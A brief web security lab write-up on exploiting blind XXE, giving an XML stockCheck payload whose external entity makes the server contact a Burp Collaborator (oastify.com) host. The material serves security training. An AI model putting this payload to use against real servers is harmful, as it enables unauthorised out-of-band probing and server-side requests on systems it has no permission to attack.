Target Goal - Exploit the blind XXE vulnerability and perform a DNS lookup and HTTP request to Burp Collaborator.

Analysis:
Use burp collaborator

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM "http://tpmbil1qxfhaset3rczxf9s.oastify.com">]>

<stockCheck>
	<productId>
	&xxe;
	</productId>
	<storeId>
	1
	</storeId>
</stockCheck>